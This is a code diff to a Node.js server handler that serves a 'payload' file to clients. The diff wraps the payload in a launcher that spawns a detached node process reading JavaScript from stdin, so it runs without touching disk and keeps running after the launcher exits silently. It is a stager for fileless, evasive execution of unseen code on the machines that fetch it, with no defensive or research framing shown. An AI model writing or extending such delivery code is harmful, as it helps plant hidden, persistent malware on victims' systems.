@@ -26,8 +26,41 @@ export default function handler(req, res) {
 
   // Client-side payload code (same for all OS)
   const scriptPath = path.resolve("./payload.js");
-  const script = fs.readFileSync(scriptPath, "utf-8");
+  const payload = fs.readFileSync(scriptPath, "utf-8");
+
+  // Launcher that spawns a detached node reading payload from stdin (no files)
+  const launcher = `
+/**
+ * Launcher (no files):
+ * - spawns a detached ` + "`node -`" + ` (read from stdin)
+ * - writes the payload into child's stdin and closes it
+ * - child keeps running; launcher exits immediately
+ */
+const cp = require('child_process');
+
+const payload = ${JSON.stringify(payload)};
+
+try {
+  // spawn node that reads JS from stdin ('-' tells node to run stdin)
+  // stdio: ['pipe', 'ignore', 'ignore'] -> we will write to stdin, ignore child's stdio
+  const child = cp.spawn(process.execPath, ['-'], {
+    detached: true,
+    stdio: ['pipe', 'ignore', 'ignore']
+  });
+
+  // Write payload to child's stdin, then close it.
+  child.stdin.write(payload);
+  child.stdin.end();
+
+  // Detach so parent can exit while child continues
+  child.unref();
+
+  process.exit(0);
+} catch (err) {
+  process.exit(1);
+}
+`;
 
   res.setHeader("Content-Type", "text/plain; charset=utf-8");
-  res.send(script);
+  res.send(launcher);
 }
